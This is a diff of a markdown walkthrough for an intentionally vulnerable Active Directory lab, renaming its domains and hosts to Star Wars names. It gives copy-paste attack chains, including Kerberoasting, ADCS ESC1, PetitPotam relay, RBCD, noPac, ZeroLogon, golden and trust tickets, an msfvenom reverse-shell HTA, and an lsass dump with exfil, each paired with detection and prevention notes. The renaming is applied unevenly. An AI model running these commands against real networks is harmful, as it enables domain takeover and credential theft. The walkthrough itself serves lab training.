@@ -9,34 +9,34 @@ This is the page to read after you've skimmed the rest. It pulls the per-ID writ
 
 ## 1. Canonical solve — zero → Enterprise Admin
 
-Assume you're on **your own Kali / BlackArch** with reach into `10.10.0.0/21`, `10.20.0.0/24`, `10.30.0.0/24` from the host bridge — no credentials, no AD position, no foothold on any lab VM. Target: `Administrator@root.corp`.
+Assume you're on **your own Kali / BlackArch** with reach into `10.10.0.0/21`, `10.20.0.0/24`, `10.30.0.0/24` from the host bridge — no credentials, no AD position, no foothold on any lab VM. Target: `Administrator@trade.corp`.
 
-> Phase 0 (Initial Access, IA-001..050) covers every zero-cred entry vector in detail — see [`02a-initial-access.md`](02a-initial-access.md). The canonical solve below uses **AS-REP roast → spray** as the cheapest IA path. Alternatives that skip steps 1-2 entirely: ZeroLogon (DC$ hash directly, IA-014), PetitPotam+relay to ADCS (DC cert directly, IA-013), phishing a ws01 user (beacon → in-memory creds, IA-019..024).
+> Phase 0 (Initial Access, IA-001..050) covers every zero-cred entry vector in detail — see [`02a-initial-access.md`](02a-initial-access.md). The canonical solve below uses **AS-REP roast → spray** as the cheapest IA path. Alternatives that skip steps 1-2 entirely: ZeroLogon (DC$ hash directly, IA-014), PetitPotam+relay to ADCS (DC cert directly, IA-013), phishing a tatooine user (beacon → in-memory creds, IA-019..024).
 
 ```
 STEP 0  ── Recon from Kali ────────────────────────────────
   nxc smb 10.10.0.0/21
   → enumerate hosts, OS, SMB signing status
   nxc ldap 10.10.0.10 -u '' -p ''                       # anon LDAP bind works
-  bloodhound-python -u guest -p '' -d corp.local -ns 10.10.0.10 -c all
+  bloodhound-python -u guest -p '' -d empire.local -ns 10.10.0.10 -c all
   → import to BloodHound, mark high-value: DA, EA, krbtgt, ADCS templates
 ```
 
 ```
 STEP 1  ── Foothold #1: AS-REP roast ──────────────────────
-  impacket-GetNPUsers corp.local/ -dc-ip 10.10.0.10 -no-pass -usersfile users.txt
+  impacket-GetNPUsers empire.local/ -dc-ip 10.10.0.10 -no-pass -usersfile users.txt
   → hash for svc_nopreauth
   hashcat -m 18200 asrep.hashes rockyou.txt
   → password recovered
 
 STEP 1' ── Alternative foothold: spray ─────────────────────
-  kerbrute passwordspray -d corp.local --dc 10.10.0.10 users.txt 'Password123!'
-  → peter.parker : Password123!
+  kerbrute passwordspray -d empire.local --dc 10.10.0.10 users.txt 'SithLord123!'
+  → peter.parker : SithLord123!
 ```
 
 ```
 STEP 2  ── Domain user ──────────────────────────────────
-  bloodhound-python -u peter.parker -p '<pw>' -d corp.local -ns 10.10.0.10 -c all
+  bloodhound-python -u peter.parker -p '<pw>' -d empire.local -ns 10.10.0.10 -c all
   → full graph, paths to DA visible
 ```
 
@@ -49,7 +49,7 @@ STEP 3  ── Pick the shortest path ──────────────
   Path E: ACL chain (WriteOwner Domain Admins, GenericWrite, etc.)
 ```
 
-Below is **Path B** — the fastest in DVAD:
+Below is **Path B** — the fastest in EMPIRE:
 
 ```
 STEP 3.B  ── ADCS ESC1 chain ──────────────────────────────
@@ -57,47 +57,47 @@ STEP 3.B  ── ADCS ESC1 chain ───────────────�
   → ESC1Template found
 
   certipy req -u peter.parker -p '<pw>' -ca corp-CA-CA \
-     -template ESC1Template -upn Administrator@corp.local \
-     -target ca01.corp.local
+     -template ESC1Template -upn Administrator@empire.local \
+     -target endor.empire.local
   → administrator.pfx
 
   certipy auth -pfx administrator.pfx -dc-ip 10.10.0.10
-  → NT hash for Administrator@corp.local
+  → NT hash for Administrator@empire.local
 ```
 
 ```
-STEP 4  ── DA on corp.local ──────────────────────────────
-  impacket-secretsdump corp.local/Administrator@10.10.0.10 -hashes :<NT>  -just-dc
+STEP 4  ── DA on empire.local ──────────────────────────────
+  impacket-secretsdump empire.local/Administrator@10.10.0.10 -hashes :<NT>  -just-dc
   → krbtgt hash, all user NT hashes, machine secrets
 ```
 
 ```
 STEP 5  ── Forge Golden TGT (persistence + cross-domain) ─
   impacket-ticketer -nthash <KRBTGT_HASH> \
-     -domain-sid S-1-5-21-CORP \
-     -domain corp.local \
-     -extra-sid S-1-5-21-CORP-EU-519 \
-     -extra-sid S-1-5-21-ROOT-519 \
+     -domain-sid S-1-5-21-EMPIRE \
+     -domain empire.local \
+     -extra-sid S-1-5-21-EMPIRE-EU-519 \
+     -extra-sid S-1-5-21-TRADE-519 \
      Administrator
   export KRB5CCNAME=Administrator.ccache
 ```
 
 ```
-STEP 6  ── Cross domain to root.corp (Enterprise Admin) ──
+STEP 6  ── Cross domain to trade.corp (Enterprise Admin) ──
   impacket-secretsdump -k -no-pass -just-dc \
-     -target-ip 10.30.0.10 root.corp/Administrator@dc01.root.corp
-  → EA hash; you are Enterprise Admin in root.corp
+     -target-ip 10.30.0.10 trade.corp/Administrator@neimoidia.trade.corp
+  → EA hash; you are Enterprise Admin in trade.corp
 ```
 
 ```
-STEP 7  ── Cross trust to finance.local ──────────────────
+STEP 7  ── Cross trust to rebel.local ──────────────────
   # forge inter-realm TGT with trust key
   impacket-ticketer -nthash <TRUSTKEY_NT> \
-     -domain-sid S-1-5-21-CORP \
-     -domain corp.local \
-     -spn 'krbtgt/finance.local' \
+     -domain-sid S-1-5-21-EMPIRE \
+     -domain empire.local \
+     -spn 'krbtgt/rebel.local' \
      Administrator
-  → use to request TGS into finance.local resources
+  → use to request TGS into rebel.local resources
 ```
 
 ```
@@ -139,7 +139,7 @@ Detect: 4769 RC4 + bulk; honeypot SPN. Prevent: AES-only; gMSAs; 25+ char random
 
 ```bash
 # 1. Enumerate SPN-bearing accounts and request TGSes (RC4)
-impacket-GetUserSPNs corp.local/peter.parker:'DVADlab2024!' -dc-ip 10.10.0.10 -request -outputfile spns.kerberoast
+impacket-GetUserSPNs empire.local/peter.parker:'EmpireLab2024!' -dc-ip 10.10.0.10 -request -outputfile spns.kerberoast
 
 # 2. Crack offline
 hashcat -m 13100 spns.kerberoast /usr/share/wordlists/rockyou.txt --force
@@ -147,7 +147,7 @@ hashcat -m 13100 spns.kerberoast /usr/share/wordlists/rockyou.txt --force
 # 3. Use the recovered password (svc_vision)
 nxc smb 10.10.0.13 -u svc_vision -p 'Summer2023!'                       # local admin?
 nxc ldap 10.10.0.10 -u svc_vision -p 'Summer2023!' --kerberoasting all  # second-hop
-impacket-getST -spn cifs/dc01.corp.local -impersonate Administrator corp.local/svc_vision:'Summer2023!'   # if constrained
+impacket-getST -spn cifs/coruscant.empire.local -impersonate Administrator empire.local/svc_vision:'Summer2023!'   # if constrained
 ```
 
 ---
@@ -163,7 +163,7 @@ impacket-getST -spn cifs/dc01.corp.local -impersonate Administrator corp.local/s
        │                                     │  - Domain Users enroll │
        │                                     │  - No manager approval │
        │                                     └────────────┬────────────┘
-       │ certipy req -upn Administrator@corp.local        │
+       │ certipy req -upn Administrator@empire.local        │
        ▼                                                   ▼
 ┌─────────────────────────┐                  ┌─────────────────────────┐
 │  Cert for Administrator │ ◀──────────────  │ Enterprise CA issues    │
@@ -183,17 +183,17 @@ Detect: 4886/4887 with requester≠SAN. Prevent: drop `ENROLLEE_SUPPLIES_SUBJECT
 
 ```bash
 # 1. Find vulnerable templates
-certipy find -u peter.parker@corp.local -p 'DVADlab2024!' -dc-ip 10.10.0.10 -stdout -vulnerable
+certipy find -u peter.parker@empire.local -p 'EmpireLab2024!' -dc-ip 10.10.0.10 -stdout -vulnerable
 
 # 2. Request a cert as Administrator using ESC1
-certipy req -u peter.parker@corp.local -p 'DVADlab2024!' -dc-ip 10.10.0.10 \
-            -ca 'CORP-CA' -template 'ESC1Template' -upn 'Administrator@corp.local'
+certipy req -u peter.parker@empire.local -p 'EmpireLab2024!' -dc-ip 10.10.0.10 \
+            -ca 'EMPIRE-CA' -template 'ESC1Template' -upn 'Administrator@empire.local'
 
 # 3. PKINIT → TGT + NT hash
 certipy auth -pfx administrator.pfx -dc-ip 10.10.0.10
 
 # 4. DCSync with the recovered hash
-impacket-secretsdump -hashes :<NT> -just-dc corp.local/Administrator@10.10.0.10
+impacket-secretsdump -hashes :<NT> -just-dc empire.local/Administrator@10.10.0.10
 ```
 
 ---
@@ -202,13 +202,13 @@ impacket-secretsdump -hashes :<NT> -just-dc corp.local/Administrator@10.10.0.10
 
 ```
 ┌────────────┐  EFSRPC OpenFileRaw    ┌─────────────────┐
-│ Attacker   │ ─────────────────────▶ │ DC01 (target)   │
+│ Attacker   │ ─────────────────────▶ │ coruscant (target)   │
 │ (PetitPotam│                         └────────┬────────┘
 │  client)   │                                  │
-└────────────┘                                  │ DC01$ auth (NTLM)
+└────────────┘                                  │ coruscant$ auth (NTLM)
    ▲                                            │ to attacker UNC
    │  send NTLM challenge from CA web enrollment
-   │  back to DC01
+   │  back to coruscant
    │                                            ▼
 ┌──┴───────────────────────┐  relay NTLM   ┌─────────────────────┐
 │ ntlmrelayx (--adcs       │ ◀────────────│  Attacker host      │
@@ -216,16 +216,16 @@ impacket-secretsdump -hashes :<NT> -just-dc corp.local/Administrator@10.10.0.10
 │ DomainController)        │               └─────────────────────┘
 └──┬───────────────────────┘
    │ relayed creds to
-   │ http://ca01/certsrv
+   │ http://endor/certsrv
    ▼
 ┌──────────────────────────┐
-│ CA issues cert for DC01$ │
+│ CA issues cert for coruscant$ │
 │ Domain Controller EKU    │
 └──┬───────────────────────┘
    │ gettgtpkinit.py / certipy auth
    ▼
 ┌──────────────────────────┐
-│ TGT for DC01$ + NT hash  │ → DCSync → DA
+│ TGT for coruscant$ + NT hash  │ → DCSync → DA
 └──────────────────────────┘
 ```
 
@@ -238,16 +238,16 @@ Detect: MDI ESC8; 4624 from DC$ to attacker IP; ADCS issuance to DC$ from non-DC
 sudo impacket-ntlmrelayx -t http://10.10.0.12/certsrv/certfnsh.asp \
                          --adcs --template DomainController -smb2support &
 
-# 2. Coerce DC01$ to authenticate to your attacker IP (10.10.0.1)
-impacket-PetitPotam -u peter.parker -p 'DVADlab2024!' -d corp.local 10.10.0.1 10.10.0.10
-# (or: impacket-coercer -u peter.parker -p 'DVADlab2024!' -d corp.local -t 10.10.0.10 -l 10.10.0.1)
+# 2. Coerce coruscant$ to authenticate to your attacker IP (10.10.0.1)
+impacket-PetitPotam -u peter.parker -p 'EmpireLab2024!' -d empire.local 10.10.0.1 10.10.0.10
+# (or: impacket-coercer -u peter.parker -p 'EmpireLab2024!' -d empire.local -t 10.10.0.10 -l 10.10.0.1)
 
 # 3. Take the base64 cert ntlmrelayx prints; convert to PFX and use PKINIT
-echo '<b64>' | base64 -d > dc01.pfx
-certipy auth -pfx dc01.pfx -dc-ip 10.10.0.10 -username 'dc01$' -domain corp.local
+echo '<b64>' | base64 -d > coruscant.pfx
+certipy auth -pfx coruscant.pfx -dc-ip 10.10.0.10 -username 'coruscant$' -domain empire.local
 
-# 4. DCSync as DC01$ → krbtgt
-impacket-secretsdump -k -no-pass -just-dc-user krbtgt corp.local/dc01\$@dc01.corp.local
+# 4. DCSync as coruscant$ → krbtgt
+impacket-secretsdump -k -no-pass -just-dc-user krbtgt empire.local/coruscant\$@coruscant.empire.local
 ```
 
 ---
@@ -268,24 +268,24 @@ impacket-secretsdump -k -no-pass -just-dc-user krbtgt corp.local/dc01\$@dc01.cor
                          └────────┬─────────┘
                                   │
                                   │ rbcd.py: write msDS-AllowedToActOnBehalfOf
-                                  │ on target (ws01$)
+                                  │ on target (tatooine$)
                                   ▼
                          ┌──────────────────┐
-                         │ ws01$ allows     │
+                         │ tatooine$ allows     │
                          │ evil$ delegation │
                          └────────┬─────────┘
                                   │ getST -impersonate Administrator
-                                  │     -spn cifs/ws01.corp.local
+                                  │     -spn cifs/tatooine.empire.local
                                   │     evil$ ccache
                                   ▼
                          ┌──────────────────┐
                          │ TGS as Admin@    │
-                         │ cifs/ws01        │
+                         │ cifs/tatooine        │
                          └────────┬─────────┘
                                   │ psexec -k -no-pass
                                   ▼
                          ┌──────────────────┐
-                         │ SYSTEM on ws01   │
+                         │ SYSTEM on tatooine   │
                          └──────────────────┘
 ```
 
@@ -294,21 +294,21 @@ Detect: 4741 (computer created by non-admin), 5136 on `msDS-AllowedToActOnBehalf
 **Commands (copy-paste):**
 
 ```bash
-# 1. Create attacker-controlled machine account (MAQ=10 in DVAD)
-impacket-addcomputer corp.local/peter.parker:'DVADlab2024!' -computer-name 'evil$' \
+# 1. Create attacker-controlled machine account (MAQ=10 in EMPIRE)
+impacket-addcomputer empire.local/peter.parker:'EmpireLab2024!' -computer-name 'evil$' \
                      -computer-pass 'EvilPass1!' -dc-ip 10.10.0.10
 
-# 2. Write RBCD attribute on the target (e.g., ws01$)
-impacket-rbcd -delegate-from 'evil$' -delegate-to 'ws01$' -dc-ip 10.10.0.10 \
-              -action write corp.local/peter.parker:'DVADlab2024!'
+# 2. Write RBCD attribute on the target (e.g., tatooine$)
+impacket-rbcd -delegate-from 'evil$' -delegate-to 'tatooine$' -dc-ip 10.10.0.10 \
+              -action write empire.local/peter.parker:'EmpireLab2024!'
 
 # 3. S4U2Self+S4U2Proxy as evil$ impersonating Administrator
-impacket-getST -spn cifs/ws01.corp.local -impersonate Administrator \
-               corp.local/evil\$:'EvilPass1!' -dc-ip 10.10.0.10
+impacket-getST -spn cifs/tatooine.empire.local -impersonate Administrator \
+               empire.local/evil\$:'EvilPass1!' -dc-ip 10.10.0.10
 
 # 4. Use the ticket
-export KRB5CCNAME=Administrator@cifs_ws01.corp.local@CORP.LOCAL.ccache
-impacket-psexec -k -no-pass ws01.corp.local
+export KRB5CCNAME=Administrator@cifs_tatooine.empire.local@empire.local.ccache
+impacket-psexec -k -no-pass tatooine.empire.local
 ```
 
 ---
@@ -316,25 +316,25 @@ impacket-psexec -k -no-pass ws01.corp.local
 ## 6. Wireframe — Pattern E: noPac (CVE-2021-42278/42287)
 
 ```
-peter.parker                                                    DC01
+peter.parker                                                    coruscant
   │  addcomputer evil$  (MAQ=10)                          │
   │ ──────────────────────────────────────────────────▶   │
   │                                                       │ ok
-  │ rename evil$ -> dc01    (no trailing $)               │
+  │ rename evil$ -> coruscant    (no trailing $)               │
   │ ──────────────────────────────────────────────────▶   │
   │                                                       │
-  │ TGT request (S4U2Self for "dc01")                     │
+  │ TGT request (S4U2Self for "coruscant")                     │
   │ ──────────────────────────────────────────────────▶   │
-  │                              ◀───────── TGT for dc01 (KDC thinks DC) │
+  │                              ◀───────── TGT for coruscant (KDC thinks DC) │
   │                                                       │
-  │ rename dc01 -> evil$ back                             │
+  │ rename coruscant -> evil$ back                             │
   │ ──────────────────────────────────────────────────▶   │
   │                                                       │
-  │ S4U2Proxy: ask for cifs/dc01 ticket as Administrator  │
+  │ S4U2Proxy: ask for cifs/coruscant ticket as Administrator  │
   │ ──────────────────────────────────────────────────▶   │
-  │                              ◀───────── TGS for Admin@cifs/dc01      │
+  │                              ◀───────── TGS for Admin@cifs/coruscant      │
   │                                                       │
-  │ secretsdump -k -no-pass on dc01                       │
+  │ secretsdump -k -no-pass on coruscant                       │
   │ ──────────────────────────────────────────────────▶   │
   │                                              krbtgt dumped
 ```
@@ -344,18 +344,18 @@ Detect: 4741+4742+4624 mismatched name; MDI noPac. Prevent: patch KB5008380; MAQ
 **Commands (copy-paste):**
 
 ```bash
-# DVAD: corp.local has MAQ=10 and is unpatched against noPac.
-impacket-noPac.py corp.local/peter.parker:'DVADlab2024!' -dc-ip 10.10.0.10 \
-                  -dc-host dc01.corp.local -shell --impersonate Administrator
+# EMPIRE: empire.local has MAQ=10 and is unpatched against noPac.
+impacket-noPac.py empire.local/peter.parker:'EmpireLab2024!' -dc-ip 10.10.0.10 \
+                  -dc-host coruscant.empire.local -shell --impersonate Administrator
 
 # Or via impacket-addcomputer + manual rename:
-impacket-addcomputer corp.local/peter.parker:'DVADlab2024!' -computer-name 'evil$' \
+impacket-addcomputer empire.local/peter.parker:'EmpireLab2024!' -computer-name 'evil$' \
                      -computer-pass 'EvilPass1!' -dc-ip 10.10.0.10
-impacket-renameMachine corp.local/peter.parker:'DVADlab2024!' -current-name 'evil$' -new-name 'dc01' -dc-ip 10.10.0.10
-impacket-getTGT corp.local/dc01:'EvilPass1!' -dc-ip 10.10.0.10
-impacket-renameMachine corp.local/peter.parker:'DVADlab2024!' -current-name 'dc01' -new-name 'evil$' -dc-ip 10.10.0.10
-KRB5CCNAME=dc01.ccache impacket-getST -self -impersonate Administrator -spn 'cifs/dc01.corp.local' -k -no-pass corp.local/dc01
-KRB5CCNAME=Administrator.ccache impacket-secretsdump -k -no-pass dc01.corp.local
+impacket-renameMachine empire.local/peter.parker:'EmpireLab2024!' -current-name 'evil$' -new-name 'coruscant' -dc-ip 10.10.0.10
+impacket-getTGT empire.local/coruscant:'EvilPass1!' -dc-ip 10.10.0.10
+impacket-renameMachine empire.local/peter.parker:'EmpireLab2024!' -current-name 'coruscant' -new-name 'evil$' -dc-ip 10.10.0.10
+KRB5CCNAME=coruscant.ccache impacket-getST -self -impersonate Administrator -spn 'cifs/coruscant.empire.local' -k -no-pass empire.local/coruscant
+KRB5CCNAME=Administrator.ccache impacket-secretsdump -k -no-pass coruscant.empire.local
 ```
 
 ---
@@ -363,7 +363,7 @@ KRB5CCNAME=Administrator.ccache impacket-secretsdump -k -no-pass dc01.corp.local
 ## 7. Wireframe — Pattern F: ZeroLogon (CVE-2020-1472)
 
 ```
-attacker                                       DC01 (vuln)
+attacker                                       coruscant (vuln)
    │ NetrServerAuthenticate2(zeros)            │
    │ ─────────────────────────────────────▶   │  (~256 attempts on avg)
    │                                            │  Netlogon AES-CFB8 IV=0 bug
@@ -372,7 +372,7 @@ attacker                                       DC01 (vuln)
    │ NetrServerPasswordSet2(empty)              │
    │ ─────────────────────────────────────▶   │
    │                                            │  DC$ password = empty
-   │ secretsdump -no-pass DC01$@DC01            │
+   │ secretsdump -no-pass coruscant$@coruscant            │
    │ ─────────────────────────────────────▶   │
    │                            ◀───── krbtgt + everything
    │
@@ -386,19 +386,19 @@ Detect: MDI native; Event 5827. Prevent: patch August 2020; `FullSecureChannelPr
 
 ```bash
 # 1. Verify the DC is vulnerable
-python3 zerologon_tester.py DC01 10.10.0.10
+python3 zerologon_tester.py coruscant 10.10.0.10
 
-# 2. Reset DC01$ machine password to empty
-python3 set_empty_pw.py DC01 10.10.0.10
+# 2. Reset coruscant$ machine password to empty
+python3 set_empty_pw.py coruscant 10.10.0.10
 
-# 3. DCSync as DC01$ with empty password
-impacket-secretsdump -no-pass -just-dc corp.local/dc01\$@10.10.0.10
+# 3. DCSync as coruscant$ with empty password
+impacket-secretsdump -no-pass -just-dc empire.local/coruscant\$@10.10.0.10
 
 # 4. Forge Golden Ticket with the krbtgt hash (now you are EA)
-impacket-ticketer -nthash <krbtgt_nt> -domain-sid <CORP_SID> -domain corp.local Administrator
+impacket-ticketer -nthash <krbtgt_nt> -domain-sid <CORP_SID> -domain empire.local Administrator
 
 # 5. CRITICAL: restore the original DC$ pwd from the secretsdump output
-python3 reinstall_original_pw.py DC01 10.10.0.10 <original_hex_pw>
+python3 reinstall_original_pw.py coruscant 10.10.0.10 <original_hex_pw>
 ```
 
 ---
@@ -406,24 +406,24 @@ python3 reinstall_original_pw.py DC01 10.10.0.10 <original_hex_pw>
 ## 8. Wireframe — Pattern G: ExtraSID (Parent → Child)
 
 ```
-eu.corp.local DA  (already compromised)
+eu.empire.local DA  (already compromised)
    │
-   │ DCSync krbtgt of eu.corp.local
+   │ DCSync krbtgt of eu.empire.local
    │
    │ mimikatz kerberos::golden
    │   /user:Administrator
-   │   /domain:eu.corp.local
+   │   /domain:eu.empire.local
    │   /sid:S-1-5-21-EU
-   │   /sids:S-1-5-21-CORP-519,         <-- Enterprise Admins parent
-   │         S-1-5-21-CORP-512          <-- Domain Admins parent
+   │   /sids:S-1-5-21-EMPIRE-519,         <-- Enterprise Admins parent
+   │         S-1-5-21-EMPIRE-512          <-- Domain Admins parent
    │   /krbtgt:<eu krbtgt hash>
    │
    ▼
 TGT with foreign privileged SIDs
    │
-   │ DCSync corp.local krbtgt
+   │ DCSync empire.local krbtgt
    ▼
-Domain Admin on corp.local (=Enterprise Admin in single-tree forest)
+Domain Admin on empire.local (=Enterprise Admin in single-tree forest)
 ```
 
 Detect: MDI SID history. Prevent: parent-child SID filtering doesn't exist — *modern recommendation is a single-domain forest*.
@@ -431,22 +431,22 @@ Detect: MDI SID history. Prevent: parent-child SID filtering doesn't exist — *
 **Commands (copy-paste):**
 
 ```bash
-# Prereq: you already have DA on eu.corp.local (child). Then:
+# Prereq: you already have DA on eu.empire.local (child). Then:
 
 # 1. Get child's krbtgt hash + SIDs
-impacket-secretsdump -just-dc-user krbtgt eu.corp.local/Administrator@10.10.0.11
-impacket-lookupsid eu.corp.local/Administrator@10.10.0.11 | grep -i 'krbtgt\|domain'
+impacket-secretsdump -just-dc-user krbtgt eu.empire.local/Administrator@10.10.0.11
+impacket-lookupsid eu.empire.local/Administrator@10.10.0.11 | grep -i 'krbtgt\|domain'
 
-# 2. Get parent (corp.local) domain SID
-impacket-lookupsid corp.local/peter.parker:'DVADlab2024!'@10.10.0.10 | head -5
+# 2. Get parent (empire.local) domain SID
+impacket-lookupsid empire.local/peter.parker:'EmpireLab2024!'@10.10.0.10 | head -5
 
 # 3. Forge Golden Ticket in CHILD with parent EA/DA SIDs appended via /sids
-impacket-ticketer -nthash <eu_krbtgt_nt> -domain-sid <EU_SID> -domain eu.corp.local \
+impacket-ticketer -nthash <eu_krbtgt_nt> -domain-sid <EU_SID> -domain eu.empire.local \
                   -extra-sid <CORP_SID>-519,<CORP_SID>-512 Administrator
 
 # 4. Use it to DCSync the PARENT
 export KRB5CCNAME=Administrator.ccache
-impacket-secretsdump -k -no-pass -just-dc corp.local/Administrator@dc01.corp.local
+impacket-secretsdump -k -no-pass -just-dc empire.local/Administrator@coruscant.empire.local
 ```
 
 ---
@@ -475,17 +475,17 @@ Detect: 4769 with no preceding 4768 same TGT; 21 ticket lifetime / weird PAC. Pr
 
 ```bash
 # Prereq: krbtgt NT hash (from DCSync) + domain SID.
-# DVAD bakes krbtgt=KrbtgtDVAD2024! so this is reproducible.
+# EMPIRE bakes krbtgt=KrbtgtEmpire2024! so this is reproducible.
 
 # 1. Compute krbtgt NT hash from the known plaintext
-python3 -c "import hashlib; print(hashlib.new('md4', 'KrbtgtDVAD2024!'.encode('utf-16-le')).hexdigest())"
+python3 -c "import hashlib; print(hashlib.new('md4', 'KrbtgtEmpire2024!'.encode('utf-16-le')).hexdigest())"
 
 # 2. Forge a 10-year Golden Ticket for any principal
-impacket-ticketer -nthash <krbtgt_nt> -domain-sid <CORP_SID> -domain corp.local Administrator
+impacket-ticketer -nthash <krbtgt_nt> -domain-sid <CORP_SID> -domain empire.local Administrator
 
 # 3. Use it
 export KRB5CCNAME=Administrator.ccache
-impacket-psexec -k -no-pass dc01.corp.local
+impacket-psexec -k -no-pass coruscant.empire.local
 ```
 
 ---
@@ -493,29 +493,29 @@ impacket-psexec -k -no-pass dc01.corp.local
 ## 10. Wireframe — Pattern I: Cross-forest via SID History + Trust key
 
 ```
-corp.local DA
+empire.local DA
    │
-   │ secretsdump -just-dc -user 'CORP$' on dc01.corp.local
-   │ extract trust key  (corp.local <-> finance.local)
+   │ secretsdump -just-dc -user 'EMPIRE$' on coruscant.empire.local
+   │ extract trust key  (empire.local <-> rebel.local)
    │
    ▼
 Trust key NT hash
    │ mimikatz kerberos::golden
-   │   /domain:corp.local
-   │   /sid:S-1-5-21-CORP
-   │   /sids:S-1-5-21-FINANCE-519       <-- foreign EA SID
+   │   /domain:empire.local
+   │   /sid:S-1-5-21-EMPIRE
+   │   /sids:S-1-5-21-REBEL-519       <-- foreign EA SID
    │   /rc4:<trustkey hash>
    │   /service:krbtgt
-   │   /target:finance.local
+   │   /target:rebel.local
    │
    ▼
 Inter-realm TGT
-   │ Rubeus asktgs /service:cifs/dc01.finance.local
+   │ Rubeus asktgs /service:cifs/yavin4.rebel.local
    ▼
-TGS for finance.local
+TGS for rebel.local
    │
    ▼
-DCSync krbtgt of finance.local
+DCSync krbtgt of rebel.local
 ```
 
 Detect: MDI SID history; abnormal cross-realm `4769`. Prevent: SID filtering on every external trust; selective auth; rotate trust keys.
@@ -523,33 +523,33 @@ Detect: MDI SID history; abnormal cross-realm `4769`. Prevent: SID filtering on 
 **Commands (copy-paste):**
 
 ```bash
-# Prereq: DA on corp.local (parent of trust); DVAD trust key = TrustKey2024!
+# Prereq: DA on empire.local (parent of trust); EMPIRE trust key = TrustKey2024!
 
-# 1. Dump the trust key for corp.local <-> finance.local
-impacket-secretsdump -just-dc-user 'finance.local$' corp.local/Administrator@10.10.0.10
+# 1. Dump the trust key for empire.local <-> rebel.local
+impacket-secretsdump -just-dc-user 'rebel.local$' empire.local/Administrator@10.10.0.10
 
-# 2. Get foreign SID (finance.local Enterprise Admins = <FIN_SID>-519)
-impacket-lookupsid corp.local/Administrator@10.10.0.10 'finance.local'
+# 2. Get foreign SID (rebel.local Enterprise Admins = <FIN_SID>-519)
+impacket-lookupsid empire.local/Administrator@10.10.0.10 'rebel.local'
 
 # 3. Forge inter-realm TGT (golden trust ticket)
 impacket-ticketer -nthash <trustkey_nt> -domain-sid <CORP_SID> \
-                  -domain corp.local -extra-sid <FIN_SID>-519 \
-                  -spn 'krbtgt/finance.local' Administrator
+                  -domain empire.local -extra-sid <FIN_SID>-519 \
+                  -spn 'krbtgt/rebel.local' Administrator
 
 # 4. Ask for a service ticket in the foreign forest and DCSync
 export KRB5CCNAME=Administrator.ccache
-impacket-getST -k -no-pass -spn cifs/dc01.finance.local -impersonate Administrator corp.local/Administrator
-impacket-secretsdump -k -no-pass -just-dc finance.local/Administrator@dc01.finance.local
+impacket-getST -k -no-pass -spn cifs/yavin4.rebel.local -impersonate Administrator empire.local/Administrator
+impacket-secretsdump -k -no-pass -just-dc rebel.local/Administrator@yavin4.rebel.local
 ```
 
 ---
 
-## 10a. Wireframe — Pattern J: Phishing → ws01 foothold → in-memory creds
+## 10a. Wireframe — Pattern J: Phishing → tatooine foothold → in-memory creds
 
 ```
 ┌────────────────┐  GoPhish / evilginx          ┌──────────────────────┐
-│ Attacker Kali  │ ───────── email ───────────▶ │ user@corp.local      │
-│ (10.10.0.1)    │   .lnk / .iso / .hta /       │ (reads on ws01)      │
+│ Attacker Kali  │ ───────── email ───────────▶ │ user@empire.local      │
+│ (10.10.0.1)    │   .lnk / .iso / .hta /       │ (reads on tatooine)      │
 │                │   library-ms / macro doc     └──────────┬───────────┘
 └────────┬───────┘                                          │ double-click
          │ HTTPS C2 listener (Sliver / Mythic / Havoc)      │ payload runs
@@ -557,7 +557,7 @@ impacket-secretsdump -k -no-pass -just-dc finance.local/Administrator@dc01.finan
          │                              ◀────── reverse HTTPS beacon
          │                                                  ▼
          │                                       ┌──────────────────────┐
-         │                                       │ ws01.corp.local      │
+         │                                       │ tatooine.empire.local      │
          │                                       │ — Defender disabled  │
          │                                       │ — user is local admin│
          │                                       └──────────┬───────────┘
@@ -568,13 +568,13 @@ impacket-secretsdump -k -no-pass -just-dc finance.local/Administrator@dc01.finan
          │  SOCKS5 over beacon                              │
          ▼                                                  ▼
 ┌────────────────────────┐                       ┌──────────────────────┐
-│ proxychains nxc / bh / │ ◀────────────────────│ pivot through ws01   │
-│ certipy from Kali      │                       │ to dc01, ca01, etc.  │
+│ proxychains nxc / bh / │ ◀────────────────────│ pivot through tatooine   │
+│ certipy from Kali      │                       │ to coruscant, endor, etc.  │
 └────────────────────────┘                       └──────────────────────┘
 ```
 
 Detect: Office spawning cmd/powershell (Sysmon 1, parent chain); LNK execution from %TEMP%; LSASS handle open with 0x1010; outbound HTTPS to non-CDN IP; ASR rules.
-Prevent: ASR ("block Office child processes"); MOTW respected; Smart App Control; LSA Protection; Credential Guard; AV/EDR on workstations (DVAD has it off on purpose).
+Prevent: ASR ("block Office child processes"); MOTW respected; Smart App Control; LSA Protection; Credential Guard; AV/EDR on workstations (EMPIRE has it off on purpose).
 
 **Commands (copy-paste):**
 
@@ -583,8 +583,8 @@ Prevent: ASR ("block Office child processes"); MOTW respected; Smart App Control
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.0.1 LPORT=4444 -f hta-psh > stage1.hta
 python3 -m http.server 8080   # serve stage1.hta + payload
 
-# 2. After detonation on ws01 — dump lsass via comsvcs.dll (no mimikatz install)
-# (run inside the beacon shell on ws01)
+# 2. After detonation on tatooine — dump lsass via comsvcs.dll (no mimikatz install)
+# (run inside the beacon shell on tatooine)
 rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <lsass_pid> C:\Users\Public\l.dmp full
 
 # 3. Exfil and parse offline with pypykatz
@@ -602,19 +602,19 @@ proxychains4 -q nxc smb 10.10.0.13 -u peter.parker -H <NTLM>
 ```
 ┌────────────────┐   DHCPv6 advertise         ┌────────────────────┐
 │ Attacker Kali  │ ────── (every machine ───▶ │ Windows hosts on   │
-│ 10.10.0.1      │        prefers IPv6) ────▶ │ corp.local subnet  │
+│ 10.10.0.1      │        prefers IPv6) ────▶ │ empire.local subnet  │
 │ mitm6 -d corp  │                            └─────────┬──────────┘
 └────────┬───────┘                                       │
-         │  attacker = primary DNS over IPv6             │ resolve wpad.corp.local
+         │  attacker = primary DNS over IPv6             │ resolve wpad.empire.local
          │                              ◀────────────────┘
          │  serve WPAD → proxy → 407 NTLM challenge
          │
          │  NTLM auth from victim WORKSTATION$ (machine acct)
          ▼
 ┌──────────────────────────┐  relay to        ┌────────────────────┐
-│ ntlmrelayx -6            │  ldap://dc01     │ DC01.corp.local    │
-│   -t ldaps://dc01        │ ───────────────▶ │ add new attacker   │
-│   -wh wpad.corp.local    │                  │ machine acct +     │
+│ ntlmrelayx -6            │  ldap://coruscant     │ coruscant.empire.local    │
